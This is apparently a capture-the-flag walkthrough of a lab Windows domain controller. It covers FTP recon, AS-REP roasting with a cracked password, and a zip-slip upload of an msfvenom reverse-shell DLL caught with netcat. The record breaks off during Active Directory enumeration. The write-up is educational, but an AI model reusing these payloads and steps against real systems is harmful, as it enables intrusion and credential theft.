Target : 10.129.238.9

Date : 27/06/2026

```bash
>  echo "10.129.238.9 bruno.htb" | sudo tee -a /etc/hosts  
Please touch the FIDO authenticator.  
10.129.238.9 bruno.htb  
>  nmap -sC -sV -O -Pn -p- --min-rate=3000 -T4 10.129.238.9  
Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-27 15:22 +0200  
Nmap scan report for bruno.htb (10.129.238.9)  
Host is up (0.045s latency).  
Not shown: 65511 filtered tcp ports (no-response)  
PORT      STATE SERVICE       VERSION  
21/tcp    open  ftp           Microsoft ftpd  
| ftp-anon: Anonymous FTP login allowed (FTP code 230)  
| 06-29-22  04:55PM       <DIR>          app  
| 06-29-22  04:33PM       <DIR>          benign  
| 06-29-22  01:41PM       <DIR>          malicious  
|_06-29-22  04:33PM       <DIR>          queue  
| ftp-syst:    
|_  SYST: Windows_NT  
53/tcp    open  domain        Simple DNS Plus  
80/tcp    open  http          Microsoft IIS httpd 10.0  
| http-methods:    
|_  Potentially risky methods: TRACE  
|_http-server-header: Microsoft-IIS/10.0  
|_http-title: IIS Windows Server  
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-06-27 13:23:14Z)  
135/tcp   open  msrpc         Microsoft Windows RPC  
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn  
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: bruno.vl, Site: Default-First-Site-Name)  
|_ssl-date: 2026-06-27T13:24:47+00:00; +1s from scanner time.  
| ssl-cert: Subject:    
| Subject Alternative Name: DNS:brunodc.bruno.vl, DNS:bruno.vl, DNS:BRUNO  
| Not valid before: 2025-10-09T09:54:08  
|_Not valid after:  2105-10-09T09:54:08  
443/tcp   open  ssl/https?  
| tls-alpn:    
|   h2  
|_  http/1.1  
| ssl-cert: Subject: commonName=bruno-BRUNODC-CA  
| Not valid before: 2022-06-29T13:23:01  
|_Not valid after:  2121-06-29T13:33:00  
|_ssl-date: TLS randomness does not represent time  
445/tcp   open  microsoft-ds?  
464/tcp   open  kpasswd5?  
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0  
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: bruno.vl, Site: Default-First-Site-Name)  
| ssl-cert: Subject:    
| Subject Alternative Name: DNS:brunodc.bruno.vl, DNS:bruno.vl, DNS:BRUNO  
| Not valid before: 2025-10-09T09:54:08  
|_Not valid after:  2105-10-09T09:54:08  
|_ssl-date: 2026-06-27T13:24:47+00:00; +1s from scanner time.  
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: bruno.vl, Site: Default-First-Site-Name)  
|_ssl-date: 2026-06-27T13:24:47+00:00; +1s from scanner time.  
| ssl-cert: Subject:    
| Subject Alternative Name: DNS:brunodc.bruno.vl, DNS:bruno.vl, DNS:BRUNO  
| Not valid before: 2025-10-09T09:54:08  
|_Not valid after:  2105-10-09T09:54:08  
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: bruno.vl, Site: Default-First-Site-Name)  
| ssl-cert: Subject:    
| Subject Alternative Name: DNS:brunodc.bruno.vl, DNS:bruno.vl, DNS:BRUNO  
| Not valid before: 2025-10-09T09:54:08  
|_Not valid after:  2105-10-09T09:54:08  
|_ssl-date: 2026-06-27T13:24:47+00:00; +1s from scanner time.  
3389/tcp  open  ms-wbt-server Microsoft Terminal Services  
| ssl-cert: Subject: commonName=brunodc.bruno.vl  
| Not valid before: 2026-06-25T20:44:37  
|_Not valid after:  2026-12-25T20:44:37  
|_ssl-date: 2026-06-27T13:24:47+00:00; +1s from scanner time.  
| rdp-ntlm-info:    
|   Target_Name: BRUNO  
|   NetBIOS_Domain_Name: BRUNO  
|   NetBIOS_Computer_Name: BRUNODC  
|   DNS_Domain_Name: bruno.vl  
|   DNS_Computer_Name: brunodc.bruno.vl  
|   DNS_Tree_Name: bruno.vl  
|   Product_Version: 10.0.20348  
|_  System_Time: 2026-06-27T13:24:07+00:00  
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)  
|_http-title: Not Found  
|_http-server-header: Microsoft-HTTPAPI/2.0  
9389/tcp  open  mc-nmf        .NET Message Framing  
49664/tcp open  msrpc         Microsoft Windows RPC  
49669/tcp open  msrpc         Microsoft Windows RPC  
60872/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0  
60873/tcp open  msrpc         Microsoft Windows RPC  
61843/tcp open  msrpc         Microsoft Windows RPC  
61848/tcp open  msrpc         Microsoft Windows RPC  
61884/tcp open  msrpc         Microsoft Windows RPC  
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port  
Device type: general purpose  
Running (JUST GUESSING): Microsoft Windows 2022|10|11|2012|2016 (89%)  
OS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_10 cpe:/o:microsoft:windows_11 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016  
Aggressive OS guesses: Microsoft Windows Server 2022 (89%), Microsoft Windows 10 1703 or Windows 11 21H2 - 23H2 (85%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2016 (85%)  
No exact OS matches for host (test conditions non-ideal).  
Service Info: Host: BRUNODC; OS: Windows; CPE: cpe:/o:microsoft:windows  
  
Host script results:  
| smb2-time:    
|   date: 2026-06-27T13:24:08  
|_  start_date: N/A  
| smb2-security-mode:    
|   3.1.1:    
|_    Message signing enabled and required  
  
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
Nmap done: 1 IP address (1 host up) scanned in 145.49 seconds
```

We've got `brunodc.bruno.vl, DNS:bruno.vl` which we'll add to our hosts, and an open `ftp 21/tcp` port which is unusual for an Active Directory, `DNS 53/tcp`, and the usual Active Directory ports : `kerberos 88/tcp, smb 445/tcp, LDAP 389/tcp and 3268/tcp, msrpc 135/tcp, netBIOS 139/tcp` but also `http 80/tcp and ssl/https? 443/tcp, ssl/ldap 636/tcp` and "ms-wbt-server" `3389/tcp`, `RPC over HTTP` and `HTTPAPI`.

We'll start by investigating the outliar :

```bash
>  ftp -invp 10.129.238.9  
Connected to 10.129.238.9.  
220 Microsoft FTP Service  
Remote system type is Windows_NT.  
ftp> user ftp  
331 Anonymous access allowed, send identity (e-mail name) as password.  
Password:    
230 User logged in.  
ftp> ls  
227 Entering Passive Mode (10,129,238,9,252,238).  
125 Data connection already open; Transfer starting.  
06-29-22  04:55PM       <DIR>          app  
06-29-22  04:33PM       <DIR>          benign  
06-29-22  01:41PM       <DIR>          malicious  
06-29-22  04:33PM       <DIR>          queue
```

We find two `directories` with `executables and .json files` :

```bash
ftp> cd app  
250 CWD command successful.  
ftp> ls  
227 Entering Passive Mode (10,129,238,9,252,241).  
125 Data connection already open; Transfer starting.  
06-29-22  05:42PM                  165 changelog  
06-28-22  07:15PM                  431 SampleScanner.deps.json  
06-29-22  03:58PM                 7168 SampleScanner.dll  
06-29-22  03:58PM               174592 SampleScanner.exe  
06-28-22  07:15PM                  170 SampleScanner.runtimeconfig.dev.json  
06-28-22  07:15PM                  154 SampleScanner.runtimeconfig.json

ftp> cd /  
250 CWD command successful.  
ftp> cd benign  
250 CWD command successful.  
ftp> ls  
227 Entering Passive Mode (10,129,238,9,252,243).  
125 Data connection already open; Transfer starting.  
06-29-22  04:32PM                    4 test.exe
```

We'll reconnect to `ftp` in `binary` to avoid errors and get the files into `~/htb/bruno`:

```
ftp -inv 10.129.238.9 <<'EOF'  
user anonymous anonymous  
binary  
cd app  
get SampleScanner.dll  
get SampleScanner.exe  
get changelog  
get SampleScanner.runtimeconfig.dev.json  
get SampleScanner.deps.json  
bye  
EOF  
Connected to 10.129.238.9.  
220 Microsoft FTP Service  
Remote system type is Windows_NT.  
331 Anonymous access allowed, send identity (e-mail name) as password.  
230 User logged in.  
200 Type set to I.  
250 CWD command successful.  
200 PORT command successful.  
125 Data connection already open; Transfer starting.  
226 Transfer complete.  
7168 bytes received in 0.0527 seconds (132.9276 kbytes/s)  
200 PORT command successful.  
125 Data connection already open; Transfer starting.  
226 Transfer complete.  
174592 bytes received in 0.1798 seconds (948.0450 kbytes/s)  
200 PORT command successful.  
125 Data connection already open; Transfer starting.  
226 Transfer complete.  
165 bytes received in 0.0319 seconds (5.0577 kbytes/s)  
200 PORT command successful.  
125 Data connection already open; Transfer starting.  
226 Transfer complete.  
170 bytes received in 0.0318 seconds (5.2136 kbytes/s)  
200 PORT command successful.  
150 Opening BINARY mode data connection.  
226 Transfer complete.  
431 bytes received in 0.0317 seconds (13.2879 kbytes/s)  
221 Goodbye.
```

```bash
>  echo "10.129.238.9 bruno.htb brunodc.bruno.vl bruno.vl" | sudo tee -a /etc/hosts  
Please touch the FIDO authenticator.  
10.129.238.9 bruno.htb brunodc.bruno.vl bruno.vl
```

Then, we look inside the files :

```bash
>  file SampleScanner.dll  
SampleScanner.dll: PE32+ executable for MS Windows 4.00 (console), x86-64 Mono/.Net assembly, 2 sections  
>  strings -n 6 SampleScanner.dll  
!This program cannot be run in DOS mode.  
`.rsrc  
v4.0.30319  
#Strings  
<PatternAt>d__0  
IEnumerable`1  
ReadOnlyCollection`1  
IEnumerator`1  
<i>5__2  
<Module>  
get_ASCII  
System.IO  
System.Collections.Generic  
get_CurrentManagedThreadId  
<>l__initialThreadId  
OpenRead  
Replace  
<>3__source  
IEnumerable  
IDisposable  
ExtractToFile  
System.IO.Compression.ZipFile  
get_FullName  
System.Runtime  
Combine  
System.IDisposable.Dispose  
<>1__state  
Delete  
CompilerGeneratedAttribute  
DebuggableAttribute  
AssemblyTitleAttribute  
IteratorStateMachineAttribute  
TargetFrameworkAttribute  
DebuggerHiddenAttribute  
AssemblyFileVersionAttribute  
AssemblyInformationalVersionAttribute  
AssemblyConfigurationAttribute  
CompilationRelaxationsAttribute  
AssemblyProductAttribute  
AssemblyCompanyAttribute  
RuntimeCompatibilityAttribute  
ZipArchive  
Encoding  
System.Runtime.Versioning  
String  
System.Diagnostics.Debug  
EndsWith  
SequenceEqual  
System.Collections.ObjectModel  
SampleScanner.dll  
Program  
System.IO.FileSystem  
System.IO.Compression  
System.Reflection  
SearchOption  
NotSupportedException  
<>3__pattern  
System.Linq  
SampleScanner  
IEnumerator  
System.Collections.Generic.IEnumerable<System.Int32>.GetEnumerator  
System.Collections.IEnumerable.GetEnumerator  
System.Diagnostics  
System.Runtime.CompilerServices  
DebuggingModes  
get_Entries  
GetFiles  
ReadAllBytes  
GetBytes  
System.Runtime.Extensions  
ZipFileExtensions  
System.Collections  
PatternAt  
Object  
System.Collections.IEnumerator.Reset  
Environment  
System.Collections.Generic.IEnumerator<System.Int32>.Current  
System.Collections.IEnumerator.Current  
System.Collections.Generic.IEnumerator<System.Int32>.get_Current  
System.Collections.IEnumerator.get_Current  
<>2__current  
MoveNext  
System.Text  
Directory  
ZipArchiveEntry  
WrapNonExceptionThrows  
.NETCoreApp,Version=v3.1  
FrameworkDisplayName  
SampleScanner  
Release  
1.0.0.0  
%SampleScanner.Program+<PatternAt>d__0  
C:\Users\xct\source\repos\SampleScanner\obj\x64\Release\netcoreapp3.1\SampleScanner.pdb  
SHA256  
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>  
<assembly xmlns="urn:schemas-microsoft-com:asm.v1" manifestVersion="1.0">  
 <assemblyIdentity version="1.0.0.0" name="MyApplication.app"/>  
 <trustInfo xmlns="urn:schemas-microsoft-com:asm.v2">  
   <security>  
     <requestedPrivileges xmlns="urn:schemas-microsoft-com:asm.v3">  
       <requestedExecutionLevel level="asInvoker" uiAccess="false"/>  
     </requestedPrivileges>  
   </security>  
 </trustInfo>  
</assembly>
```

`GetFiles, SearchOption and Directory` list files, then `EndsWith / ZipFileExtensions` keeps .zip files, `ZipArchive` opens the archives and inspects the entries, then `Combine` builds the destination point where the extraction should be written then extracts them, usually inside the `baseFolder` (unless it has an absolute path, which can be abused).  `ReadAllBytes, GetBytes and PatternAt` look for `Byte Pattern(s)` inside the unzipped files.`Delete` might tell us that it deletes the `zip archive` after unzipping it which confirms our hypothesis.

The `Combine` might be the abuse here : if we manage to implement a file inside an archive that has an `absolute path` (here, a Windows absolute path) it might get extracted directly in that path.

```bash
> grep -aoiE '[a-z0-9._-]+' changelog SampleScanner.runtimeconfig.dev.json | sort -u | less

changelog:-  
changelog:0.1  
changelog:0.2  
changelog:0.3  
changelog:additional  
changelog:automation  
changelog:dev  
changelog:EICAR  
changelog:for  
changelog:functionality  
changelog:initial  
changelog:integrated  
changelog:site  
changelog:string  
changelog:support  
changelog:svc_scan  
changelog:using  
changelog:Version  
changelog:with  
SampleScanner.runtimeconfig.dev.json:additionalProbingPaths  
SampleScanner.runtimeconfig.dev.json:arch  
SampleScanner.runtimeconfig.dev.json:C  
SampleScanner.runtimeconfig.dev.json:.dotnet  
SampleScanner.runtimeconfig.dev.json:.nuget  
SampleScanner.runtimeconfig.dev.json:packages  
SampleScanner.runtimeconfig.dev.json:runtimeOptions  
SampleScanner.runtimeconfig.dev.json:store  
SampleScanner.runtimeconfig.dev.json:tfm  
SampleScanner.runtimeconfig.dev.json:Users  
SampleScanner.runtimeconfig.dev.json:xct
```

We got `Users : xct` and `svc_scan` as a `Microsoft Service`.

We'll build a userlist with those and `Administrator` and `kerbrute userenum` :

```bash
>  nano bruno.txt  
>  cat bruno.txt  
xct  
svc_scan  
Administrator
>  kerbrute userenum -d bruno.vl --dc 10.129.238.9 bruno.txt  
  
   __             __               __        
  / /_____  _____/ /_  _______  __/ /____    
 / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \  
/ ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/  
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                           
  
Version: dev (n/a) - 06/27/26 - Ronnie Flathers @ropnop  
  
2026/06/27 17:33:06 >  Using KDC(s):  
2026/06/27 17:33:06 >   10.129.238.9:88  
  
2026/06/27 17:33:06 >  [+] VALID USERNAME:       Administrator@bruno.vl  
2026/06/27 17:33:06 >  [+] svc_scan has no pre auth required. Dumping hash to crack offline:  
[REDACTED]  
2026/06/27 17:33:06 >  [+] VALID USERNAME:       svc_scan@bruno.vl
```

We got `svc_scan` with a hash `$krb5asrep$18$svc_scan@BRUNO.VL..`, so `krb..user@DOMAIN` which matches `Kerberos AS-REP etype 18 (RC4-HMAC)` and `hashcat -m 18200`.

We'll decrypt it :

```bash
>  GetNPUsers.py bruno.vl/ -usersfile bruno.txt -no-pass -format hashcat -outputfile asrep.hashcat -dc-ip 10.129.238.9  
  
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies    
  
[REDACTED]  
[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set  
>  cat asrep.hashcat  
  
[REDACTED]  
>  hashcat -m 18200 asrep.hashcat /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt  
  
hashcat (v7.1.2) starting  
  
OpenCL API (OpenCL 3.0 PoCL 7.1  Linux, Release, RELOC, LLVM 20.1.8, SLEEF, DISTRO, CUDA, POCL_DEBUG) - Platform #1 [The pocl project]  
======================================================================================================================================  
* Device #01: cpu-haswell-AMD Ryzen 5 3500U with Radeon Vega Mobile Gfx, 8912/17824 MB (8912 MB allocatable), 8MCU  
  
Minimum password length supported by kernel: 0  
Maximum password length supported by kernel: 256  
Minimum salt length supported by kernel: 0  
Maximum salt length supported by kernel: 256  
  
Hashes: 1 digests; 1 unique digests, 1 unique salts  
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates  
Rules: 1  
  
Optimizers applied:  
* Zero-Byte  
* Not-Iterated  
* Single-Hash  
* Single-Salt  
  
ATTENTION! Pure (unoptimized) backend kernels selected.  
Pure kernels can crack longer passwords, but drastically reduce performance.  
If you want to switch to optimized kernels, append -O to your commandline.  
See the above message to find out about the exact limits.  
  
Watchdog: Temperature abort trigger set to 90c  
  
Host memory allocated for this attack: 514 MB (14233 MB free)  
  
Dictionary cache hit:  
* Filename..: /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt  
* Passwords.: 14344384  
* Bytes.....: 139921497  
* Keyspace..: 14344384  
  
$krb5asrep$23$svc_scan@BRUNO.VL:[REDACTED]:Sunshine1  
                                                            
Session..........: hashcat  
Status...........: Cracked  
Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)  
Hash.Target......: $krb5asrep$23$svc_scan@BRUNO.VL:[REDACTED]  
Time.Started.....: Sat Jun 27 17:53:33 2026 (0 secs)  
Time.Estimated...: Sat Jun 27 17:53:33 2026 (0 secs)  
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)  
Guess.Base.......: File (/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt)  
Guess.Queue......: 1/1 (100.00%)  
Speed.#01........:  1246.0 kH/s (3.53ms) @ Accel:1024 Loops:1 Thr:1 Vec:8  
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)  
Progress.........: 32768/14344384 (0.23%)  
Rejected.........: 0/32768 (0.00%)  
Restore.Point....: 24576/14344384 (0.17%)  
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1  
Candidate.Engine.: Device Generator  
Candidates.#01...: 271087 -> dyesebel  
Hardware.Mon.#01.: Temp: 72c Util: 18%  
  
Started: Sat Jun 27 17:53:32 2026  
Stopped: Sat Jun 27 17:53:35 2026
```

We got `svc_scan:Sunshine1`.

We'll confirm with `netexec` :

```bash
>  nxc smb 10.129.238.9 -u svc_scan -p 'Sunshine1' --shares  
  
SMB         10.129.238.9    445    BRUNODC          [*] Windows Server 2022 Build 20348 x64 (name:BRUNODC) (domain:bruno.vl) (signing:True) (SMBv1:None) (Null Auth:True)  
SMB         10.129.238.9    445    BRUNODC          [+] bruno.vl\svc_scan:Sunshine1    
SMB         10.129.238.9    445    BRUNODC          [*] Enumerated shares  
SMB         10.129.238.9    445    BRUNODC          Share           Permissions     Remark  
SMB         10.129.238.9    445    BRUNODC          -----           -----------     ------  
SMB         10.129.238.9    445    BRUNODC          ADMIN$                          Remote Admin  
SMB         10.129.238.9    445    BRUNODC          C$                              Default share  
SMB         10.129.238.9    445    BRUNODC          CertEnroll      READ            Active Directory Certificate Services share  
SMB         10.129.238.9    445    BRUNODC          IPC$            READ            Remote IPC  
SMB         10.129.238.9    445    BRUNODC          NETLOGON        READ            Logon server share    
SMB         10.129.238.9    445    BRUNODC          queue           READ,WRITE         
SMB         10.129.238.9    445    BRUNODC          SYSVOL          READ            Logon server share    
>  nxc winrm 10.129.238.9 -u svc_scan -p 'Sunshine1'  
WINRM       10.129.238.9    5985   BRUNODC          [*] Windows Server 2022 Build 20348 (name:BRUNODC) (domain:bruno.vl)    
WINRM       10.129.238.9    5985   BRUNODC          [-] bruno.vl\svc_scan:Sunshine1
```

We have `READ,WRITE` in `queue`. Which means we can write a `.zip` file containing an `absolute path named file` inside.

We'll craft a payload using `msfvenom` :

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.129 LPORT=9000 -f dll -o Microsoft.DiaSymReader.Native.amd64.dll  
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload  
[-] No arch selected, selecting arch: x64 from the payload  
No encoder specified, outputting raw payload  
Payload size: 460 bytes  
Final size of dll file: 9216 bytes  
Saved as: Microsoft.DiaSymReader.Native.amd64.dll
```

We write it as `Microsoft.DiaSymReader.Native.amd64.dll` since `SampleScanner.exe` is looking for this file.

Then, we put it inside an `absolute path` to abuse the `program` we found :

```bash
python3 - <<'PY'  
import zipfile  
source = "Microsoft.DiaSymReader.Native.amd64.dll"  
zip_name = "scrow.zip"  
arcname = r"C:\samples\app\Microsoft.DiaSymReader.Native.amd64.dll"  
with zipfile.ZipFile(zip_name, "w", zipfile.ZIP_DEFLATED) as zf:  
   zf.write(source, arcname=arcname)  
print(f"Wrote {zip_name}")  
print(f"Entry name: {arcname}")  
PY  
Wrote scrow.zip  
Entry name: C:\samples\app\Microsoft.DiaSymReader.Native.amd64.dll
```

`scrow.zip` now contains the `absolute path named file.`

We launch a `netcat` listener :

```bash
>  rlwrap nc -lvnp 9000  
  
Listening on 0.0.0.0 9000
```

And upload our malicious .zip file via our `WRITE` privilege on `SMB` via netexec :

```bash
>  nxc smb 10.129.238.9 -u svc_scan -p 'Sunshine1' --share queue --put-file scrow.zip scrow.zip  
  
SMB         10.129.238.9    445    BRUNODC          [*] Windows Server 2022 Build 20348 x64 (name:BRUNODC) (domain:bruno.vl) (signing:True) (SMBv1:None) (Null Auth:True)  
SMB         10.129.238.9    445    BRUNODC          [+] bruno.vl\svc_scan:Sunshine1    
SMB         10.129.238.9    445    BRUNODC          [*] Copying scrow.zip to scrow.zip  
SMB         10.129.238.9    445    BRUNODC          [+] Created file scrow.zip on \\queue\scrow.zip
```

Now, we wait for the program to find our `zip` file and open it the absolute path instead of the `baseFolder` and open the `windows/x64/shell_reverse_tcp` payload redirecting the target to our `VPN IP` through the `LHOST` : `tcp port 9000` we configured with `msfvenom` as the `.dll` we crafted.

Our listener gets the shell :

```bash
>  rlwrap nc -lvnp 9000  
  
Listening on 0.0.0.0 9000  
Connection received on 10.129.238.9 65196  
Microsoft Windows [Version 10.0.20348.768]  
(c) Microsoft Corporation. All rights reserved.  
  
C:\Windows\system32>cd /Users  
cd /Users  
  
C:\Users>dir  
dir  
Volume in drive C has no label.  
Volume Serial Number is 076D-3413  
  
Directory of C:\Users  
  
06/29/2022  04:09 PM    <DIR>          .  
10/04/2024  09:28 PM    <DIR>          Administrator  
09/15/2021  03:12 PM    <DIR>          Public  
10/04/2024  09:28 PM    <DIR>          svc_scan  
              0 File(s)              0 bytes  
              4 Dir(s)   2,424,438,784 bytes free  
  
C:\Users>type C:\Users\svc_scan\Desktop\user.txt  
type C:\Users\svc_scan\Desktop\user.txt  
[REDACTED]
```

And we got the user flag.

```PowerShell
C:\Windows\system32>whoami /priv  
whoami /priv  
  
PRIVILEGES INFORMATION  
----------------------  
  
Privilege Name                Description                    State      
============================= ============================== ========  
SeMachineAccountPrivilege     Add workstations to domain     Disabled  
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled    
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled  
  
C:\Windows\system32>whoami /groups  
whoami /groups  
  
GROUP INFORMATION  
-----------------  
  
Group Name                                  Type             SID          Attributes                                           
=========================================== ================ ============ ==================================================  
Everyone                                    Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group  
BUILTIN\Users                               Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group  
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group  
BUILTIN\Certificate Service DCOM Access     Alias            S-1-5-32-574 Mandatory group, Enabled by default, Enabled group  
NT AUTHORITY\BATCH                          Well-known group S-1-5-3      Mandatory group, Enabled by default, Enabled group  
CONSOLE LOGON                               Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group  
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group  
NT AUTHORITY\This Organization              Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group  
LOCAL                                       Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group  
Authentication authority asserted identity  Well-known group S-1-18-1     Mandatory group, Enabled by default, Enabled group  
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448
```

We try `nxc ldap` to get the `Machine Account Quota` of the service account :

```bash
>  nxc ldap 10.129.238.9 -u svc_scan -p 'Sunshine1' -M maq  
  
LDAP        10.129.238.9    389    BRUNODC          [*] Windows Server 2022 Build 20348 (name:BRUNODC) (domain:bruno.vl) (signing:None) (channel binding:Never)    
LDAP        10.129.238.9    389    BRUNODC          [+] bruno.vl\svc_scan:Sunshine1    
MAQ         10.129.238.9    389    BRUNODC          [*] Getting the MachineAccountQuota  
MAQ         10.129.238.9    389    BRUNODC          MachineAccountQuota: 10
```

That means we can create `10 Machine Accounts.`
Our `SeMachineAccountPrivilege` is `disabled` on this shell.

We'll use `bloodyad` to add the `Machine Account` anyways,  it appears in `whoami /priv` and the `Active Directory` allows for the creation of the `Machine Account` despite the `svc_scan` shell saying it's `disabled`.

```bash
>  /usr/bin/bloodyad -d bruno.vl -u svc_scan -p Sunshine1 --host 10.129.238.9 get object scrowpc$  
  
distinguishedName: CN=scrowpc,CN=Computers,DC=bruno,DC=vl  
accountExpires: 9999-12-31 23:59:59.999999+00:00  
badPasswordTime: 1601-01-01 00:00:00+00:00  
badPwdCount: 0  
cn: scrowpc  
codePage: 0  
countryCode: 0  
dNSHostName: scrowpc.bruno.vl  
dSCorePropagationData: 1601-01-01 00:00:00+00:00  
instanceType: 4  
isCriticalSystemObject: False  
lastLogoff: 1601-01-01 00:00:00+00:00  
lastLogon: 1601-01-01 00:00:00+00:00  
localPolicyFlags: 0  
logonCount: 0  
mS-DS-CreatorSID: S-1-5-21-1536375944-4286418366-3447278137-1104  
nTSecurityDescriptor: O:S-1-5-21-1536375944-4286418366-3447278137-512G:S-1-5-21-1536375944-4286418366-3447278137-513D:(OA;;WP;5f202010-79a5-11d0-9020-00c04fc2d4cf;bf967a86-0de6-11d0-a285-00aa003049e2;S-1-5-21-1  
536375944-4286418366-3447278137-1104)(OA;;WP;bf967950-0de6-11d0-a285-00aa003049e2;bf967a86-0de6-11d0-a285-00aa003049e2;S-1-5-21-1536375944-4286418366-3447278137-1104)(OA;;WP;bf967953-0de6-11d0-a285-00aa003049e2  
;bf967a86-0de6-11d0-a285-00aa003049e2;S-1-5-21-1536375944-4286418366-3447278137-1104)(OA;;WP;3e0abfd0-126a-11d0-a060-00aa006c33ed;bf967a86-0de6-11d0-a285-00aa003049e2;S-1-5-21-1536375944-4286418366-3447278137-1  
104)(OA;;SW;72e39547-7b18-11d1-adef-00c04fd8d5cd;;S-1-5-21-1536375944-4286418366-3447278137-1104)(OA;;SW;f3a64788-5306-11d1-a9c5-0000f80367c1;;S-1-5-21-1536375944-4286418366-3447278137-1104)(OA;;WP;4c164200-20c  
0-11d0-a768-00aa006e0529;;S-1-5-21-1536375944-4286418366-3447278137-1104)(OA;;0x30;bf967a7f-0de6-11d0-a285-00aa003049e2;;S-1-5-21-1536375944-4286418366-3447278137-517)(OA;;0x3;bf967aa8-0de6-11d0-a285-00aa003049  
e2;;S-1-5-32-550)(OA;;RP;46a9b11d-60ae-405a-b7e8-ff8a58d456d2;;S-1-5-32-560)(OA;;CR;ab721a53-1e2f-11d0-9819-00aa0040529b;;S-1-1-0)(OA;;SW;72e39547-7b18-11d1-adef-00c04fd8d5cd;;S-1-5-10)(OA;;SW;f3a64788-5306-11d  
1-a9c5-0000f80367c1;;S-1-5-10)(OA;;0x30;77b5b886-944a-11d1-aebd-0000f80367c1;;S-1-5-10)(A;;0x20194;;;S-1-5-21-1536375944-4286418366-3447278137-1104)(A;;0xf01ff;;;S-1-5-21-1536375944-4286418366-3447278137-512)(A  
;;0xf01ff;;;S-1-5-32-548)(A;;0x3;;;S-1-5-10)(A;;0x20094;;;S-1-5-11)(A;;0xf01ff;;;S-1-5-18)(OA;CIIOID;RP;4c164200-20c0-11d0-a768-00aa006e0529;4828cc14-1437-45bc-9b07-ad6f015e5f28;S-1-5-32-554)(OA;CIIOID;RP;4c164  
200-20c0-11d0-a768-00aa006e0529;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-32-554)(OA;CIIOID;RP;5f202010-79a5-11d0-9020-00c04fc2d4cf;4828cc14-1437-45bc-9b07-ad6f015e5f28;S-1-5-32-554)(OA;CIIOID;RP;5f202010-79a5  
-11d0-9020-00c04fc2d4cf;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-32-554)(OA;CIIOID;RP;bc0ac240-79a9-11d0-9020-00c04fc2d4cf;4828cc14-1437-45bc-9b07-ad6f015e5f28;S-1-5-32-554)(OA;CIIOID;RP;bc0ac240-79a9-11d0-90  
20-00c04fc2d4cf;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-32-554)(OA;CIIOID;RP;59ba2f42-79a2-11d0-9020-00c04fc2d3cf;4828cc14-1437-45bc-9b07-ad6f015e5f28;S-1-5-32-554)(OA;CIIOID;RP;59ba2f42-79a2-11d0-9020-00c04  
fc2d3cf;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-32-554)(OA;CIIOID;RP;037088f8-0ae1-11d2-b422-00a0c968f939;4828cc14-1437-45bc-9b07-ad6f015e5f28;S-1-5-32-554)(OA;CIIOID;RP;037088f8-0ae1-11d2-b422-00a0c968f939;  
bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-32-554)(OA;CIID;0x30;5b47d60f-6090-40b2-9f37-2a4de88f3063;;S-1-5-21-1536375944-4286418366-3447278137-526)(OA;CIID;0x30;5b47d60f-6090-40b2-9f37-2a4de88f3063;;S-1-5-21-1  
536375944-4286418366-3447278137-527)(OA;ID;SW;9b026da6-0d3c-465c-8bee-5199d7165cba;;S-1-5-21-1536375944-4286418366-3447278137-1104)(OA;CIIOID;SW;9b026da6-0d3c-465c-8bee-5199d7165cba;bf967a86-0de6-11d0-a285-00aa  
003049e2;S-1-3-0)(OA;CIID;SW;9b026da6-0d3c-465c-8bee-5199d7165cba;bf967a86-0de6-11d0-a285-00aa003049e2;S-1-5-10)(OA;CIID;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967a86-0de6-11d0-a285-00aa003049e2;S-1-5-9)(OA;  
